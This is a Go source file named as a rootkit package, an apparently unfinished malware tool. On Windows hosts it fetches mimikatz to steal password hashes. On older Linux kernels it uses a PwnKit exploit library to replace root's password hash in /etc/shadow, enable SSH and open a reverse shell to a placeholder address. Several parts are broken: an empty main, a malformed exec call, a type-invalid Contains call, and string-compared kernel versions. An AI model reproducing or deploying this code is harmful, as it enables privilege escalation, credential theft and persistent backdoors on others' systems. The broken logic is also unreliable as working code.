package rootkit

import (
	"log"
	"os/exec"
	"strings"

	ez_pwnkit "github.com/OXDBXKXO/ez-pwnkit"
	"github.com/matishsiao/goInfo"
	"github.com/themakers/osinfo"
)

func main() {

}

func hashstealer() {
	download := exec.Command("curl -O https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe")
	err := download.Run()

	if err != nil {
		log.Fatal("Error Download")
	}

}
func pwnkitprivescalation() {
	ez_pwnkit.Command(`sed -i -e 's,^root:[^:]\+:,root:$6$eymNRCK.KxwDM6vu$idH0swGW1nsnLb8fT1QibUho5xg7uGJT7fuiheLZHIi9M4gTSk0qIOlUIk2Mm9/Nz5C.T4GkgkmLcK5BtOPkS0:,' etc/shadow`, false) //this code change root password for (password)
}

func backdoorlinux() {
	ez_pwnkit.Command("systemctl start ssh", false)
	ez_pwnkit.Command("systemctl enable ssh", false)
	ez_pwnkit.RevShell("<<ip:port>>") //optinal with this revshell you will get root
}

func backdoorwindows() {

}

func checksoft() {
	distro_windows_info := osinfo.GetInfo()

	if strings.Contains(distro_windows_info.Kernel != "") {

	}

}

func getoskernellinux() {
	host, _ := goInfo.GetInfo()
	kernel := host.Core
	host.VarDump()

	if host.OS != "linux" {
		hashstealer()
		backdoorwindows()

	} else {
		if kernel < "5.16.2" {
			pwnkitprivescalation()
			backdoorlinux()
		}

	}

}
